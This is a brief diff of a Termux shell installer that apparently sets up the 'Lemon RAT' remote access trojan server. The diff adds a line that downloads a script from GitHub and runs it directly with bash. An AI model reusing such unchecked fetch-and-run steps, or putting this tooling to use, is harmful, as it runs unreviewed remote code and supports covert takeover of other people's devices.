@@ -50,5 +50,7 @@ sleep 5.0
 clear
 echo -e "\e[1;34m[√] \e[96mType Lemon To Start Server\e[0m"
 
-termux-open-url https://h4ck3r.me/how-to-install-lemon-rat-in-termux-newmethod-by-h4ck3r/
+pkg install wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh
+
+termux-open-url https://h4ck3r.me/
 
